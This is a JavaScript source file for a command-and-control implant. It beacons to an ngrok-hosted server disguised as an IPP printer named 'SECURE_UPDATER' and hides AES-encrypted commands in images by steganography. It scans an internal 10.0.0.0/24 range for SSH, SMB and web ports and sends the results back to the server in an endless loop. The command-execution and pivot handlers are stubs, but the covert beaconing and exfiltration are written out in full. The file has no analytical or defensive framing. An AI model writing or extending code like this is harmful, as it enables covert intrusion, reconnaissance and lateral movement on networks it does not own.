const crypto = require('crypto');
const axios = require('axios');
const { lsb } = require('stegano');
const { Buffer } = require('buffer');
const { exec } = require('child_process');
const chalk = require('chalk');
const fs = require('fs');
const util = require('util');

const execPromise = util.promisify(exec);

// Configuration
const IPP_SERVER = 'http://3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app:631/printers/SECURE_UPDATER';
const SECRET = 'fixed-secret-123';
const TARGET_PORTS = [22, 80, 443, 445, 631, 8080];
const IP_RANGE = '10.0.0.0/24';
const SCANNERS = ['nc', 'masscan', 'nmap'];
const RETRY_FILE = '/tmp/retry_vulnerable.txt';

// Log failed attempts
function logRetry(target, error) {
    const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    fs.appendFileSync(RETRY_FILE, `${timestamp} - ${target}: Failed (${error})\n`);
}

// Derive encryption key
function deriveKey(identifier) {
    const hash = crypto.createHash('sha256');
    hash.update(identifier + SECRET);
    return Buffer.from(hash.digest().slice(0, 32)).toString('base64');
}

// Encrypt/decrypt functions
function encrypt(data, key) {
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'base64'), Buffer.alloc(16, 0));
    let encrypted = cipher.update(data);
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return encrypted.toString('base64');
}

function decrypt(data, key) {
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key, 'base64'), Buffer.alloc(16, 0));
    let decrypted = decipher.update(Buffer.from(data, 'base64'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString();
}

// Send IPP print job with encrypted command
async function sendCommand(command, identifier) {
    const key = deriveKey(identifier);
    const encryptedCommand = encrypt(command, key);
    
    // Hide command in an image using steganography
    const image = Buffer.from('dummy_image_data'); // Placeholder
    const hiddenImage = lsb.hide(image, encryptedCommand);
    
    const ippRequest = {
        operation: 'Print-Job',
        attributes: {
            'printer-uri': IPP_SERVER,
            'job-name': 'SecureUpdate-' + Math.random().toString(36).slice(2),
            'document-format': 'image/jpeg'
        },
        data: hiddenImage
    };
    
    try {
        console.log(chalk.magenta(`[${new Date().toLocaleTimeString()}] Sending command: ${command}`));
        const response = await axios.post(IPP_SERVER, ippRequest, {
            headers: { 'Content-Type': 'application/ipp' }
        });
        const result = decrypt(response.data, key);
        console.log(chalk.green(`[${new Date().toLocaleTimeString()}] Command response: ${result}`));
        return result;
    } catch (error) {
        console.error(`[${new Date().toLocaleTimeString()}] IPP request error: ${error.message}`);
        logRetry(IPP_SERVER, `Command ${command}: ${error.message}`);
        return null;
    }
}

// Enhanced port scanner with external tools
async function scanNetwork(ipRange, ports) {
    const results = [];
    const shuffledScanners = SCANNERS.sort(() => Math.random() - 0.5);
    
    for (const scanner of shuffledScanners) {
        console.log(`[${new Date().toLocaleTimeString()}] Scanning with ${scanner}`);
        let output = '';
        try {
            if (scanner === 'nc') {
                const { stdout } = await execPromise(`nc -z -w 1 -v ${ipRange} ${ports.join(',')} 2>&1`);
                output = stdout;
            } else if (scanner === 'masscan' && (await execPromise('command -v masscan')).code === 0) {
                const { stdout } = await execPromise(`masscan ${ipRange} -p${ports.join(',')} --max-rate 500`);
                output = stdout;
            } else if (scanner === 'nmap' && (await execPromise('command -v nmap')).code === 0) {
                const { stdout } = await execPromise(`nmap -p ${ports.join(',')} --open -n -T3 ${ipRange} -oG -`);
                output = stdout;
            } else {
                continue; // Skip unavailable scanners
            }

            for (const line of output.split('\n')) {
                let ip, port;
                if (scanner === 'nc' && (line.includes('succeeded') || line.includes('open'))) {
                    const match = line.match(/(\d+\.\d+\.\d+\.\d+):(\d+)/);
                    if (match) {
                        ip = match[1];
                        port = parseInt(match[2]);
                    }
                } else if (scanner === 'masscan' && line.includes('open')) {
                    const match = line.match(/(\d+\.\d+\.\d+\.\d+).*port (\d+)/);
                    if (match) {
                        ip = match[1];
                        port = parseInt(match[2]);
                    }
                } else if (scanner === 'nmap' && line.includes('Host:') && line.includes('open')) {
                    const match = line.match(/Host: (\d+\.\d+\.\d+\.\d+).*Ports: (\d+)\/open/);
                    if (match) {
                        ip = match[1];
                        port = parseInt(match[2]);
                    }
                }
                if (ip && port && ports.includes(port)) {
                    console.log(chalk.red(`[${new Date().toLocaleTimeString()}] Open port: ${ip}:${port}`));
                    results.push({ ip, port });
                }
            }
            if (results.length > 0) {
                break; // Exit after successful scan
            }
        } catch (error) {
            console.error(`[${new Date().toLocaleTimeString()}] ${scanner} scan error: ${error.message}`);
            logRetry(`${ipRange}:${ports.join(',')}`, `${scanner} failed: ${error.message}`);
        }
        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1000));
    }

    // Fallback to original scanner if no results
    if (results.length === 0) {
        for (let i = 1; i <= 254; i++) {
            const ip = `10.0.0.${i}`;
            for (const port of ports) {
                try {
                    const response = await sendCommand(`SCAN:${ip}:${port}`, ip);
                    if (response.includes('OPEN')) {
                        console.log(chalk.red(`[${new Date().toLocaleTimeString()}] Open port: ${ip}:${port}`));
                        results.push({ ip, port });
                    }
                } catch (error) {
                    logRetry(`${ip}:${port}`, `Fallback scan: ${error.message}`);
                }
            }
        }
    }
    return results;
}

// Execute command
async function executeCommand(command, identifier) {
    console.log(chalk.magenta(`[${new Date().toLocaleTimeString()}] Executing: ${command}`));
    if (command.startsWith('EXEC:')) {
        const cmd = command.slice(5);
        return `Executed: ${cmd}`; // Placeholder
    } else if (command.startsWith('PIVOT:')) {
        const [targetIp, targetPort] = command.slice(6).split(':');
        return `Pivoted to ${targetIp}:${targetPort}`; // Placeholder
    } else if (command.startsWith('SCAN:')) {
        const [_, ip, port] = command.split(':');
        return `Port ${port} on ${ip} is OPEN`; // Simulated
    }
    return 'Unknown command';
}

// Main C2 loop
async function startC2() {
    const identifier = `${require('os').hostname()}-${crypto.randomBytes(4).toString('hex')}`;
    while (true) {
        try {
            const command = await sendCommand('CHECKIN', identifier);
            if (command) {
                const result = await executeCommand(command, identifier);
                await sendCommand(`RESULT:${result}`, identifier);
            }
            const openPorts = await scanNetwork(IP_RANGE, TARGET_PORTS);
            if (openPorts.length > 0) {
                await sendCommand(`SCAN_RESULT:${JSON.stringify(openPorts)}`, identifier);
            }
        } catch (error) {
            console.error(`[${new Date().toLocaleTimeString()}] C2 error: ${error.message}`);
            logRetry('C2 loop', error.message);
        }
        await new Promise(resolve => setTimeout(resolve, Math.random() * 5000 + 5000));
    }
}

// Start C2
if (typeof window !== 'undefined' && window.WebSocket) {
    startC2();
} else if (typeof module !== 'undefined' && module.exports) {
    startC2();
}
